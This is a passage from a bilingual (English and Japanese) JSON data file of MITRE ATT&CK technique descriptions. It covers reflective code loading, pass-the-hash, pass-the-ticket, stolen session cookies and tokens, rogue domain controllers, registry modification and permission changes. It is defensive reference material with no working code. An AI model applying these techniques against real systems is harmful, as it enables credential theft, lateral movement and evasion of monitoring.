                "description_jp": "攻撃者は、悪意のあるペイロードの実行を隠蔽するために、プロセスにコードをリフレクティブにロードする可能性があります。リフレクティブローディングには、ディスク上のファイルパス（例：[共有モジュール](https://attack.mitre.org/techniques/T1129)）に裏打ちされたスレッドやプロセスを作成するのではなく、プロセスのメモリ内で直接ペイロードを割り当ててから実行することが含まれます。\n\nリフレクティブにロードされたペイロードは、コンパイル済みバイナリ、匿名ファイル（RAMにのみ存在する）、またはファイルレス実行可能コードのスタブ（位置独立シェルコードなど）である場合があります。(引用: Introducing Donut)(引用: S1 Custom Shellcode Tool)(引用: Stuart ELF Memory)(引用: 00sec Droppers)(引用: Mandiant BYOL) 例えば、[PowerShell](https://attack.mitre.org/techniques/T1059/001)によって実行される`Assembly.Load()`メソッドは、実行中のプロセスに生のコードをロードするために悪用される可能性があります。(引用: Microsoft AssemblyLoad)\n\nリフレクティブコードインジェクションは、[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と非常によく似ていますが、「インジェクション」が別のプロセスのメモリではなく、プロセス自身のメモリにコードをロードする点が異なります。リフレクティブローディングは、任意のコードの実行が正当またはその他の良性のプロセスの下でマスクされる可能性があるため、プロセスベースの検出を回避する可能性があります。ペイロードをメモリに直接リフレクティブにロードすると、ディスク上にファイルやその他のアーティファクトを作成することを回避できる可能性があり、また、マルウェアが実行されるまでこれらのペイロードを暗号化（またはその他の方法で難読化）したままにすることも可能になります。(引用: Stuart ELF Memory)(引用: 00sec Droppers)(引用: Intezer ACBackdoor)(引用: S1 Old Rat New Tricks)",
                "subtechniques": []
            },
            {
                "id": "T1550",
                "name_eng": "Use Alternate Authentication Material",
                "name_jp": "代替認証マテリアルの使用",
                "description_eng": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",
                "description_jp": "攻撃者は、パスワードハッシュ、Kerberosチケット、アプリケーションアクセストークンなどの代替認証マテリアルを使用して、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。\n\n認証プロセスでは通常、有効なID（ユーザー名など）と1つ以上の認証要素（パスワード、PIN、物理スマートカード、トークンジェネレーターなど）が必要です。代替認証マテリアルは、ユーザーまたはアプリケーションが有効なIDと必要な認証要素を提供して正常に認証された後、システムによって正当に生成されます。代替認証マテリアルは、ID作成プロセス中に生成されることもあります。(引用: NIST Authentication)(引用: NIST MFA)\n\n代替認証マテリアルをキャッシュすることにより、システムはユーザーに認証要素の再入力を求めることなく、IDが正常に認証されたことを確認できます。代替認証はシステムによってメモリまたはディスクに保持される必要があるため、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)テクニックによって盗まれるリスクがあります。代替認証マテリアルを盗むことにより、攻撃者はシステムアクセス制御をバイパスし、平文のパスワードや追加の認証要素を知らなくてもシステムに認証できます。",
                "subtechniques": [
                    {
                        "id": "T1550.004",
                        "name_eng": "Web Session Cookie",
                        "name_jp": "Webセッションクッキー",
                        "description_eng": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)",
                        "description_jp": "攻撃者は、盗まれたセッションクッキーを使用してWebアプリケーションやサービスに認証できます。このテクニックは、セッションが既に認証されているため、一部の多要素認証プロトコルをバイパスします。(引用: Pass The Cookie)\n\n認証クッキーは、ユーザーがサービスに認証した後、資格情報が渡されたり再認証が頻繁に行われたりする必要がないように、クラウドベースのサービスを含むWebアプリケーションで一般的に使用されます。クッキーは、Webアプリケーションがアクティブに使用されていなくても、長期間有効であることがよくあります。[Webセッションクッキーの窃取](https://attack.mitre.org/techniques/T1539)または[Webクッキー](https://attack.mitre.org/techniques/T1606/001)を通じてクッキーを取得した後、攻撃者は制御下にあるブラウザにクッキーをインポートし、セッションクッキーがアクティブである限りユーザーとしてサイトまたはアプリケーションを使用できます。サイトにログインすると、攻撃者は機密情報にアクセスしたり、メールを読んだり、被害者アカウントが実行する権限を持つアクションを実行したりできます。\n\n多要素認証システムをバイパスするためにセッションクッキーを標的とするマルウェアの例があります。(引用: Unit 42 Mac Crypto Cookies January 2019)"
                    },
                    {
                        "id": "T1550.001",
                        "name_eng": "Application Access Token",
                        "name_jp": "アプリケーションアクセストークン",
                        "description_eng": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) \n\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)\n\nDirect API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",
                        "description_jp": "攻撃者は、盗まれたアプリケーションアクセストークンを使用して、通常の認証プロセスをバイパスし、リモートシステム上の制限されたアカウント、情報、またはサービスにアクセスする可能性があります。これらのトークンは通常、ユーザーまたはサービスから盗まれ、ログイン資格情報の代わりに使用されます。\n\nアプリケーションアクセストークンは、ユーザーまたはサービスに代わって承認されたAPIリクエストを行うために使用され、クラウド、コンテナベースのアプリケーション、およびSoftware-as-a-Service（SaaS）のリソースにアクセスするために一般的に使用されます。(引用: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)\n\nOAuthは、システムへのアクセス用にユーザーにトークンを発行する一般的に実装されているフレームワークの1つです。これらのフレームワークは、ユーザーを検証し、ユーザーが実行できるアクションを決定するために共同で使用されます。IDが確立されると、トークンはユーザーの実際の資格情報を渡すことなくアクションを承認できます。したがって、トークンの侵害により、攻撃者は悪意のあるアプリケーションを通じて他のサイトのリソースにアクセスできるようになる可能性があります。(引用: okta)\n\n例えば、クラウドベースの電子メールサービスでは、OAuthアクセストークンが悪意のあるアプリケーションに付与されると、バックグラウンドアクセスを可能にする「リフレッシュ」トークンが付与された場合、ユーザーアカウントの機能に長期間アクセスできる可能性があります。(引用: Microsoft Identity Platform Access 2019) OAuthアクセストークンを使用すると、攻撃者はユーザーが付与したREST APIを使用して、電子メールの検索や連絡先の列挙などの機能を実行できます。(引用: Staaldraad Phishing with OAuth 2017)\n\n侵害されたアクセストークンは、他のサービスを侵害するための最初のステップとして使用される場合があります。例えば、トークンが被害者の主要な電子メールへのアクセスを許可する場合、攻撃者はパスワード忘れルーチンをトリガーすることにより、ターゲットが購読している他のすべてのサービスへのアクセスを拡張できる可能性があります。AWSおよびGCP環境では、攻撃者は別のユーザーアカウントの権限を持つ短期間のアクセストークンのリクエストをトリガーできます。(引用: Google Cloud Service Account Credentials)(引用: AWS Temporary Security Credentials) その後、攻撃者はこのトークンを使用して、元のアカウントではできなかったデータの要求やアクションの実行を行うことができます。この機能の権限が誤って構成されている場合（例えば、すべてのユーザーが特定のアカウントのトークンを要求できるようにするなど）、攻撃者はクラウドアカウントへの初期アクセスを取得したり、権限を昇格させたりできる可能性があります。(引用: Rhino Security Labs Enumerating AWS Roles)\n\nトークンを介した直接APIアクセスは、第2認証要素の有効性を無効にし、パスワードの変更などの直感的な対策の影響を受けない可能性があります。例えば、AWS環境では、ユーザーのAWS API資格情報を侵害した攻撃者は、`sts:GetFederationToken` API呼び出しを使用してフェデレーションユーザーセッションを作成できます。これは元のユーザーと同じ権限を持ちますが、元のユーザー資格情報が無効化されても存続する可能性があります。(引用: Crowdstrike AWS User Federation Persistence) さらに、APIチャネルを介したアクセス乱用は、アクセスが正当なワークフローと依然としてよく整合している可能性があるため、サービスプロバイダー側からでも検出が困難な場合があります。"
                    },
                    {
                        "id": "T1550.003",
                        "name_eng": "Pass the Ticket",
                        "name_jp": "パスザチケット",
                        "description_eng": "Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",
                        "description_jp": "攻撃者は、盗まれたKerberosチケットを使用して「パスザチケット」を行い、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。パスザチケット（PtT）は、アカウントのパスワードにアクセスすることなくKerberosチケットを使用してシステムに認証する方法です。Kerberos認証は、リモートシステムへの横方向の移動の最初のステップとして使用できます。\n\nPtTを実行する場合、[有効なアカウント](https://attack.mitre.org/techniques/T1078)の有効なKerberosチケットは[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)によってキャプチャされます。アクセスレベルに応じて、ユーザーのサービスチケットまたはチケット付与チケット（TGT）を取得できます。サービスチケットは特定のリソースへのアクセスを許可しますが、TGTはチケット付与サービス（TGS）からサービスチケットを要求して、ユーザーがアクセスする権限を持つ任意のリソースにアクセスするために使用できます。(引用: ADSecurity AD Kerberos Attacks)(引用: GentilKiwi Pass the Ticket)\n\n[シルバーチケット](https://attack.mitre.org/techniques/T1558/002)は、Kerberosを認証メカニズムとして使用するサービスに対して取得でき、その特定のリソースおよびそのリソースをホストするシステム（SharePointなど）にアクセスするためのチケットを生成するために使用されます。(引用: ADSecurity AD Kerberos Attacks)\n\n[ゴールデンチケット](https://attack.mitre.org/techniques/T1558/001)は、キー配布サービスアカウントKRBTGTアカウントNTLMハッシュを使用してドメインに対して取得でき、Active Directory内の任意のアカウントのTGTを生成できます。(引用: Campbell 2014)\n\n攻撃者はまた、盗まれたパスワードハッシュやAESキーなど、他のユーザー情報を使用して有効なKerberosチケットを作成する可能性があります。例えば、「オーバーパスザハッシュ」では、NTLMパスワードハッシュを使用してユーザーとして認証し（つまり[パスザハッシュ](https://attack.mitre.org/techniques/T1550/002)）、同時にパスワードハッシュを使用して有効なKerberosチケットを作成します。(引用: Stealthbits Overpass-the-Hash)"
                    },
                    {
                        "id": "T1550.002",
                        "name_eng": "Pass the Hash",
                        "name_jp": "パスザハッシュ",
                        "description_eng": "Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",
                        "description_jp": "攻撃者は、盗まれたパスワードハッシュを使用して「パスザハッシュ」を行い、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。パスザハッシュ（PtH）は、ユーザーの平文パスワードにアクセスすることなくユーザーとして認証する方法です。この方法は、平文パスワードを必要とする標準的な認証ステップをバイパスし、パスワードハッシュを使用する認証の部分に直接移動します。\n\nPtHを実行する場合、使用されているアカウントの有効なパスワードハッシュは、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)テクニックを使用してキャプチャされます。キャプチャされたハッシュはPtHと共に使用され、そのユーザーとして認証されます。認証されると、PtHを使用してローカルまたはリモートシステムでアクションを実行できます。\n\n攻撃者はまた、盗まれたパスワードハッシュを使用して「オーバーパスザハッシュ」を行うこともあります。PtHと同様に、これにはパスワードハッシュを使用してユーザーとして認証することが含まれますが、パスワードハッシュを使用して有効なKerberosチケットも作成します。このチケットは、その後[パスザチケット](https://attack.mitre.org/techniques/T1550/003)攻撃を実行するために使用できます。(引用: Stealthbits Overpass-the-Hash)"
                    }
                ]
            },
            {
                "id": "T1207",
                "name_eng": "Rogue Domain Controller",
                "name_jp": "不正なドメインコントローラー",
                "description_eng": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
                "description_jp": "攻撃者は、Active Directoryデータを操作可能にするために、不正なドメインコントローラーを登録する可能性があります。DCShadowは、不正なドメインコントローラー（DC）を作成するために使用される場合があります。DCShadowは、DCの動作を登録（または非アクティブな登録を再利用）およびシミュレートすることにより、オブジェクトやスキーマを含むActive Directory（AD）データを操作する手法です。(引用: DCShadow Blog) 登録されると、不正なDCは、資格情報やキーを含む任意のドメインオブジェクトのADインフラストラクチャに変更を注入して複製できる可能性があります。\n\n不正なDCの登録には、ADスキーマの構成パーティションに新しいサーバーオブジェクトとnTDSDSAオブジェクトを作成する必要があり、これには管理者権限（ドメインまたはDCローカルのいずれか）またはKRBTGTハッシュが必要です。(引用: Adsecurity Mimikatz Guide)\n\nこのテクニックは、不正なDCで行われたアクションがこれらのセンサーに報告されない可能性があるため、セキュリティ情報およびイベント管理（SIEM）製品などのシステムログ記録およびセキュリティ監視をバイパスする可能性があります。(引用: DCShadow Blog) このテクニックはまた、フォレンジック分析を妨害するために、レプリケーションやその他の関連メタデータを変更および削除するために使用される場合もあります。攻撃者はまた、このテクニックを利用して[SID履歴インジェクション](https://attack.mitre.org/techniques/T1134/005)を実行したり、ADオブジェクト（アカウント、アクセス制御リスト、スキーマなど）を操作して永続化のためのバックドアを確立したりする可能性があります。(引用: DCShadow Blog)",
                "subtechniques": []
            },
            {
                "id": "T1610",
                "name_eng": "Deploy Container",
                "name_jp": "コンテナのデプロイ",
                "description_eng": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)\n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)",
                "description_jp": "攻撃者は、実行を容易にしたり防御を回避したりするために、環境にコンテナをデプロイする可能性があります。場合によっては、攻撃者は特定のイメージまたはデプロイメントに関連付けられたプロセス（マルウェアを実行またはダウンロードするプロセスなど）を実行するために新しいコンテナをデプロイする可能性があります。また、攻撃者はネットワークルール、ユーザー制限などなしで構成された新しいコンテナをデプロイして、環境内の既存の防御をバイパスする可能性があります。Kubernetes環境では、攻撃者は特定のノードに特権コンテナまたは脆弱なコンテナをデプロイして、[ホストへのエスケープ](https://attack.mitre.org/techniques/T1611)を行い、ノードで実行されている他のコンテナにアクセスしようとする可能性があります。(引用: AppSecco Kubernetes Namespace Breakout 2020)\n\nコンテナは、Dockerの<code>create</code>および<code>start</code> APIを介して、またはKubernetesダッシュボードやKubeflowなどのWebアプリケーションを介して、さまざまな方法でデプロイできます。(引用: Docker Containers API)(引用: Kubernetes Dashboard)(引用: Kubeflow Pipelines) Kubernetes環境では、コンテナはReplicaSetやDaemonSetなどのワークロードを介してデプロイされる場合があり、これによりコンテナを複数のノードにデプロイできます。(引用: Kubernetes Workload Management) 攻撃者は、取得または構築された悪意のあるイメージに基づいてコンテナをデプロイしたり、実行時に悪意のあるペイロードをダウンロードして実行する良性のイメージからコンテナをデプロイしたりする可能性があります。(引用: Aqua Build Images on Hosts)",
                "subtechniques": []
            },
            {
                "id": "T1112",
                "name_eng": "Modify Registry",
                "name_jp": "レジストリの変更",
                "description_eng": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\n\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\n\nThe Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to [Impair Defenses](https://attack.mitre.org/techniques/T1562), such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.\n\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)",
                "description_jp": "攻撃者は、防御回避、永続化、および実行を支援するために、さまざまな他のテクニックの一部としてWindowsレジストリと対話する可能性があります。\n\nレジストリの特定の領域へのアクセスはアカウントの権限に依存し、一部のキーは管理者レベルのアクセスが必要です。組み込みのWindowsコマンドラインユーティリティ[Reg](https://attack.mitre.org/software/S0075)は、ローカルまたはリモートのレジストリ変更に使用できます。(引用: Microsoft Reg) リモートアクセスツールなどの他のツールも、Windows APIを介してレジストリと対話する機能を含む場合があります。\n\nレジストリは、[難読化されたファイルまたは情報](https://attack.mitre.org/techniques/T1027)を介して構成情報や悪意のあるペイロードを隠すために変更される場合があります。(引用: Unit42 BabyShark Feb 2019)(引用: Avaddon Ransomware 2021)(引用: Microsoft BlackCat Jun 2022)(引用: CISA Russian Gov Critical Infra 2018) レジストリはまた、すべてのMicrosoft Office製品のマクロを有効にしたり、ユーザーに警告することなく権限昇格を許可したり、許可される最大アウトバウンドリクエスト数を増やしたり、メモリに平文の資格情報を保存するようにシステムを変更したりするなど、[防御の阻害](https://attack.mitre.org/techniques/T1562)を行うために変更される場合もあります。(引用: CISA LockBit 2023)(引用: Unit42 BabyShark Feb 2019)\n\nリモートシステムのレジストリは、横方向の移動の一環としてファイルの実行を支援するために変更される場合があります。これには、ターゲットシステムでリモートレジストリサービスが実行されている必要があります。(引用: Microsoft Remote) 多くの場合、RPC通信のためのリモートシステムの[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)へのアクセスと共に、[有効なアカウント](https://attack.mitre.org/techniques/T1078)が必要です。\n\n最後に、レジストリの変更には、キー名の先頭にヌル文字を追加するなど、キーを非表示にするアクションも含まれる場合があります。これにより、[Reg](https://attack.mitre.org/software/S0075)またはWin32 APIを使用する他のユーティリティを介して読み取られると、エラーが発生したり無視されたりします。(引用: Microsoft Reghide NOV 2006) 攻撃者はこれらの擬似非表示キーを悪用して、永続性を維持するために使用されるペイロード/コマンドを隠蔽する可能性があります。(引用: TrendMicro POWELIKS AUG 2014)(引用: SpectorOps Hiding Reg Jul 2017)",
                "subtechniques": []
            },
            {
                "id": "T1535",
                "name_eng": "Unused/Unsupported Cloud Regions",
                "name_jp": "未使用/未サポートのクラウドリージョン",
                "description_eng": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\n\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\n\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.\n\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)",
                "description_jp": "攻撃者は、検出を回避するために、未使用の地理的サービスリージョンにクラウドインスタンスを作成する可能性があります。通常、アクセスはクラウドインフラストラクチャの管理に使用されるアカウントを侵害することによって取得されます。\n\nクラウドサービスプロバイダーは、パフォーマンスの向上、冗長性の提供、および顧客がコンプライアンス要件を満たすことを可能にするために、世界中にインフラストラクチャを提供することがよくあります。多くの場合、顧客は利用可能なリージョンのサブセットのみを使用し、他のリージョンを積極的に監視しない場合があります。攻撃者が未使用のリージョンにリソースを作成した場合、検出されずに操作できる可能性があります。\n\nこの動作のバリエーションは、クラウドリージョン間の機能の違いを利用します。攻撃者は、活動の検出を回避するために、高度な検出サービスをサポートしていないリージョンを利用する可能性があります。\n\n攻撃者による未使用のAWSリージョンの使用例としては、[リソースハイジャック](https://attack.mitre.org/techniques/T1496)による暗号通貨のマイニングがあり、使用される処理能力によっては、組織に長期にわたって多額の費用がかかる可能性があります。(引用: CloudSploit - Unused AWS Regions)",
                "subtechniques": []
            },
            {
                "id": "T1222",
                "name_eng": "File and Directory Permissions Modification",
                "name_jp": "ファイルおよびディレクトリのアクセス許可の変更",
                "description_eng": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior)",
                "description_jp": "攻撃者は、ファイルまたはディレクトリのアクセス許可/属性を変更して、アクセス制御リスト（ACL）を回避し、保護されたファイルにアクセスする可能性があります。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) ファイルおよびディレクトリのアクセス許可は、通常、ファイルまたはディレクトリの所有者、または適切なアクセス許可を持つユーザーによって構成されたACLによって管理されます。ファイルおよびディレクトリのACL実装はプラットフォームによって異なりますが、一般に、どのユーザーまたはグループがどのアクション（読み取り、書き込み、実行など）を実行できるかを明示的に指定します。\n\n変更には、特定のアクセス権の変更が含まれる場合があり、これにはファイルの所有権の取得や、ファイルの既存の権限によっては昇格された権限が必要になる場合があります。これにより、特定のファイルやディレクトリの変更、置換、削除などの悪意のあるアクティビティが可能になる場合があります。特定のファイルやディレクトリの変更は、[アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)を介した永続性の確立、[ブートまたはログオン初期化スクリプト](https://attack.mitre.org/techniques/T1037)、[Unixシェル構成の変更](https://attack.mitre.org/techniques/T1546/004)、または[実行フローのハイジャック](https://attack.mitre.org/techniques/T1574)を介した他の重要なバイナリ/構成ファイルの汚染/ハイジャックなど、多くのテクニックに必要なステップである可能性があります。\n\n攻撃者はシンボリックリンクの権限も変更する可能性があります。例えば、マルウェア（特にランサムウェア）はシンボリックリンクと関連設定を変更して、リモートパスを持つローカルショートカットからファイルへのアクセスを可能にする場合があります。(引用: new_rust_based_ransomware)(引用: bad_luck_blackcat)(引用: falconoverwatch_blackcat_attack)(引用: blackmatter_blackcat)(引用: fsutil_behavior)",
                "subtechniques": [
                    {
                        "id": "T1222.002",
                        "name_eng": "Linux and Mac File and Directory Permissions Modification",
                        "name_jp": "LinuxおよびMacのファイルとディレクトリのアクセス許可の変更",
